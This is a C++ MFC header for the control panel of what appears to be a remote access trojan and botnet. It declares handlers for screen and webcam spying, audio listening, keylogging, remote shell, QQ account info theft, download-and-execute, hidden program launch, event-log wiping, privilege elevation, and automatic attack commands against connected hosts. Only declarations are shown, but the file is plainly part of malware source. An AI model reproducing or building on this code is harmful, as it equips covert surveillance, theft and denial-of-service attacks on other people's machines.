// ClientView.h : interface of the CClientView class
//
/////////////////////////////////////////////////////////////////////////////

#if !defined(AFX_ClientVIEW_H__14553897_2664_48B4_A82B_6D6F8F789ED3__INCLUDED_)
#define AFX_ClientVIEW_H__14553897_2664_48B4_A82B_6D6F8F789ED3__INCLUDED_

#include "IniFile.h"

#if _MSC_VER > 1000
#pragma once
#endif // _MSC_VER > 1000

class CClientView : public CListView
{
protected: // create from serialization only
	CClientView();
	DECLARE_DYNCREATE(CClientView)

public:

// Operations
public:
// Overrides
	int CountID;
	void NewInitialUpdate();
	void ChildNotifyWidth();
	
	CXTPTabControl m_wndTabControl;
	void SendSelectCommand(PBYTE pData, UINT nSize);
	void SendAttackCommand(PBYTE pData, UINT nSize);
	void SendStopAttackCommand(PBYTE pData, UINT nSize);
	void SendDllCommand(LPCTSTR lpDllName, LPBYTE lparam, DWORD dwDataSize);
	void Attack(PBYTE pData, UINT nSize);
	void StopAttack(PBYTE pData, UINT nSize);

	// ClassWizard generated virtual function overrides
	//{{AFX_VIRTUAL(CClientView)
	public:
	virtual void OnInitialUpdate(); // called first time after construct
	protected:
	virtual void OnDraw(CDC* pDC);  // overridden to draw this view
	virtual BOOL PreCreateWindow(CREATESTRUCT& cs);
	virtual BOOL OnNotify(WPARAM wParam, LPARAM lParam, LRESULT* pResult);
	//}}AFX_VIRTUAL

// Implementation
public:
	CIniFile m_IniFile;
	CListCtrl *m_pListCtrl;
	CIOCPServer* m_iocpServer;
	virtual ~CClientView();
#ifdef _DEBUG
	virtual void AssertValid() const;
	virtual void Dump(CDumpContext& dc) const;
#endif

protected:
	int             m_nSortedCol;
	bool            m_bAscending;
	CXTPHeaderCtrl  m_header;
	void SortColumn(int iCol, bool bAsc);
	static DWORD WINAPI CheckOnlineHost(LPVOID lParam);//检测在线主机.
	DWORD operate;                 //双击时的默认操作
	// 处理双击事件
	void TestDbClick(void);

// Generated message map functions
protected:
	//{{AFX_MSG(CClientView)
	afx_msg int OnCreate(LPCREATESTRUCT lpCreateStruct);
	afx_msg void OnCustomDraw(NMHDR*, LRESULT*);
	afx_msg void ModifyDrawStyle(UINT uFlag, BOOL bRemove);
	afx_msg void EnableControls(BOOL bRedraw);
	afx_msg void OnSize(UINT nType, int cx, int cy);
	afx_msg void OnRButtonDown(UINT nFlags, CPoint point);
	afx_msg void OnFileManager();
	afx_msg void OnScreenspy();
	afx_msg void OnWebcam();
	afx_msg void OnReStart();
	afx_msg void OnRemove();
	afx_msg void OnKeyboard();
	afx_msg void OnSystem();
	afx_msg void OnRemoteShell();
	afx_msg void OnLogoff();
	afx_msg void OnReboot();
	afx_msg void OnShutdown();
	afx_msg void OnSelectAll();
	afx_msg void OnUnselectAll();
	afx_msg void OnChat();
	afx_msg void OnSerManager();
	afx_msg void OnQQInfo();
	afx_msg void OnMap();
	//复制信息
	afx_msg void OnIPList();
	afx_msg void OnIP();
	afx_msg void OnBeiZhu();
	afx_msg void OnDiLiXinXi();
	afx_msg void OnAll();
	//筛选功能
	afx_msg void OnChongZhi();
	afx_msg void OnSortProcess();
	afx_msg void OnSortWindow();
	afx_msg void OnModifyListYN(LPARAM lParam,CHAR *strp);
	//下载上传访问网页////////////////////
	afx_msg void OnOpenUrl(CHAR *IpBti,CHAR *IpurlDeta,int OpeUrl);
	afx_msg void OnDownExec();
	afx_msg void OnUpdateServer();
	afx_msg void OnStartHide();
	afx_msg char *OnOpenFileName();
	afx_msg char *OnOpenFileDll();
	afx_msg void OnStartShow();
	afx_msg void OnStartNRun();
	afx_msg void OnOpenUrlHide();
	afx_msg void OnOpenUrlShow();
    /////////////////////////////
	afx_msg void OnCleanEvent();
	afx_msg void OnCleanSystem();
	afx_msg void OnCleanSecurity();
	afx_msg void OnCleanApplication();
	////////////////////////
	afx_msg void OnRenameRemark();
	afx_msg void OnAudioListen();
	afx_msg void OnDisconnect();
	afx_msg void OnShowMsg();//发送消息
	afx_msg void OnChangeGroup();
	afx_msg void OnSysinfo();
	afx_msg void OnRegedit();
	afx_msg int FindCountry(CString local);
	afx_msg void OnLButtonDblClk(UINT nFlags, CPoint point);
	afx_msg void OnPrank();
	afx_msg void OnStart();
	afx_msg void OnScreen();
	afx_msg void OnMenuitemProxyMap();
	afx_msg void OnElevate_Privileges();//WIN7提升权限
	afx_msg void OnReStartexp();//重启Exp
	afx_msg void OnIEQC();
	//}}AFX_MSG
	DECLARE_MESSAGE_MAP()
private:
	CImageList   I_ImageList;

	afx_msg LRESULT OnOpenManagerDialog(WPARAM /*wParam*/, LPARAM /*lParam*/);
	afx_msg	LRESULT OnOpenScreenSpyDialog(WPARAM, LPARAM);
	afx_msg	LRESULT	OnOpenWebCamDialog(WPARAM, LPARAM);
	afx_msg	LRESULT	OnOpenAudioDialog(WPARAM, LPARAM);
	afx_msg LRESULT OnOpenKeyBoardDialog(WPARAM, LPARAM);
	afx_msg LRESULT OnOpenSystemDialog(WPARAM, LPARAM);
	afx_msg LRESULT OnOpenShellDialog(WPARAM, LPARAM);
	afx_msg LRESULT OnRemoveFromList(WPARAM, LPARAM);
	afx_msg LRESULT OnAddToList(WPARAM, LPARAM);
	afx_msg LRESULT OnOpenChatDialog(WPARAM, LPARAM);
	afx_msg LRESULT OnOpenQQInfoDialog(WPARAM, LPARAM);
	afx_msg LRESULT OnOpenSysInfoDialog(WPARAM, LPARAM);
	afx_msg	LRESULT	OnOpenRegeditDialog(WPARAM, LPARAM);
	afx_msg LRESULT OnOpenSerManagerDialog(WPARAM, LPARAM);
	afx_msg LRESULT OnOpenDllDialog(WPARAM wParam, LPARAM lParam);
	afx_msg LRESULT OnModifyList(WPARAM, LPARAM);
	afx_msg LRESULT OnNoModifyList(WPARAM, LPARAM);
	afx_msg	LRESULT	OnOpenProxyMapDialog(WPARAM, LPARAM);

private:
	BOOL m_AutoAttack;//新上线自动...
	ATTACK m_AutoAttackData;//自动攻击参数.
	WORD m_AutoTask;
	
};


/////////////////////////////////////////////////////////////////////////////

//{{AFX_INSERT_LOCATION}}
// Microsoft Visual C++ will insert additional declarations immediately before the previous line.

#endif // !defined(AFX_ClientVIEW_H__14553897_2664_48B4_A82B_6D6F8F789ED3__INCLUDED_)
